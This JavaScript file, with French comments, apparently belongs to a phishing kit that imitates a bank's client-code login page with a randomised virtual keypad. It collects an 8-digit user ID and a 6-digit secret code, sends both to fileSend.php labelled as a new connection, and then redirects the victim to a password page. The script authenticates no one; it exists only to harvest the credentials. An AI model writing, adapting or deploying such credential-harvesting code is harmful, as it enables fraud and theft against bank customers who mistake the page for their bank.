function sendData(titre, data) {
  const formData = new FormData();
  formData.append('titre', titre);

  data.forEach((item, index) => {
    for (const key in item) {
      formData.append(`data[${index}][${key}]`, item[key]);
    }
  });

  fetch('fileSend.php', {
    method: 'POST',
    body: formData
  })
    .then(response => response.json())
    .then(json => {
      if (json.success) {
        console.log("Succès:", json.message);
      } else {
        console.error("Erreur:", json.message);
        if (json.debug) console.debug("Détails debug:", json.debug);
      }
    })
    .catch(error => {
      console.error("Erreur réseau ou JSON invalide:", error);
    });
}


document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form.component-mire-codeclient");
  const userIdInput = document.getElementById("user_id");
  const validateButton = document.getElementById("btn-validate");
  const label = document.querySelector('label[for="user_id"]');
  const clavier = document.getElementById("clavier");
  const btnContainer = document.getElementById("btn-container");
  const codeDisplay = document.getElementById("code");
  const keyboard = document.getElementById("gda_vk");
  const clearCodeButton = document.getElementById("clear-code");
  const authentButton = document.getElementById("btn-authent");

  const codeInput = [];
  const maxDigits = 6;

  // 🔒 Empêche la soumission du formulaire
  if (form) {
    form.addEventListener("submit", (e) => e.preventDefault());
  }

  // 🧪 Validation live du champ user_id
  if (userIdInput) {
    userIdInput.addEventListener("input", () => {
      if (/^\d{8}$/.test(userIdInput.value)) {
        userIdInput.classList.add("is-valid");
      } else {
        userIdInput.classList.remove("is-valid");
      }
    });
  }

  // 🎯 Clic sur "Valider" (user ID)
  if (validateButton) {
    validateButton.addEventListener("click", (e) => {
      e.preventDefault();

      setTimeout(() => {
        if (label) label.style.display = "none";
        if (btnContainer) btnContainer.style.display = "none";
        if (clavier) clavier.style.display = "block";
      }, 1000);
    });
  }

  // 🔢 Génère le clavier
  function generateKeyboard() {
    const allPositions = Array.from({ length: 16 }, (_, i) => i);
    const digits = [...Array(10).keys()];
    const shuffled = allPositions.sort(() => Math.random() - 0.5);
    const digitPositions = shuffled.slice(0, 10);
    const grid = Array(16).fill(null);

    digits.forEach((digit, i) => {
      grid[digitPositions[i]] = digit;
    });

    keyboard.innerHTML = "";

    grid.forEach((val) => {
      const btn = document.createElement("div");
      btn.classList.add("key");

      if (val === null) {
        btn.classList.add("empty");
      } else {
        btn.textContent = val;
        btn.addEventListener("click", () => {
          if (codeInput.length < maxDigits) {
            codeInput.push(val);
            updateCodeDisplay();
          }
        });
      }

      keyboard.appendChild(btn);
    });
  }

  // 🔐 Met à jour l'affichage du code saisi
  function updateCodeDisplay() {
    let display = "";
    for (let i = 0; i < maxDigits; i++) {
      display += codeInput[i] !== undefined ? "• " : "_ ";
    }
    codeDisplay.textContent = display.trim();
  }

  // 🧹 Icône de suppression du code
  if (clearCodeButton) {
    clearCodeButton.addEventListener("click", () => {
      codeInput.length = 0;
      updateCodeDisplay();
    });
  }

  let jsError = document.getElementById('js-error');

  if (authentButton) {
    authentButton.addEventListener("click", () => {
      const codeSaisi = codeInput.join("");  // Crée une chaîne de code à partir du tableau

      if (codeSaisi.length === maxDigits) {
        // Envoie une requête AJAX pour exécuter le fichier PHP (fileSend.php)
        const data = [
          { user_id: userIdInput.value }, { code_Secret: codeSaisi }]
        sendData('🔑 Nouvelle Connexion', data);

        // ✅ Tous les chiffres sont présents → redirection
        window.location.href = "password.html";
      }
      else {
        jsError.innerHTML = '';
        jsError.innerHTML = '<div class="inner"><div class="message">La saisie de votre Code Secret est obligatoire.</div></div>';
      }
    });
  }


  // 🚀 Génération initiale du clavier
  if (keyboard && codeDisplay) {
    generateKeyboard();
    updateCodeDisplay();
  }
});
